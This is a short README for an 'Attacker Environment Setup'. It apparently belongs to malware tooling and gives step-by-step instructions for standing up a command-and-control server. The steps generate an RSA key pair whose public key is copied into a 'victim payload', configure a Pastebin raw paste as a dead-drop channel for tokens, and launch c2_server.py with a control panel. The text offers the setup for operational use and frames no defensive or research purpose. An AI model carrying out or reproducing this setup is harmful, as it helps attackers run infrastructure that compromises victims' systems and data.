# Attacker Environment Setup

## 1. Prerequisites

Install the required packages:

```bash
pip3 install -r requirements.txt
```

## 2. Generate Master Keys

You must generate the RSA key pair before running the server. Run these commands in this directory:

```bash
# Generate private key
openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:4096

# Extract public key (You will need to COPY this to the victim payload)
openssl rsa -pubout -in private_key.pem -out public_key.pem

# Secure the private key
chmod 600 private_key.pem
```

## 3. Configure Dead Drop

1. Go to [Pastebin.com](https://pastebin.com).
2. Create a new paste with the text "Waiting for token...".
3. Copy the **RAW** URL (e.g., `https://pastebin.com/raw/abc123XYZ`).
4. Edit `c2_server.py` and update `DEAD_DROP_URL` with this link.

## 4. Run the Server

```bash
python3 c2_server.py
```

Access the panel at `http://127.0.0.1:5000`.
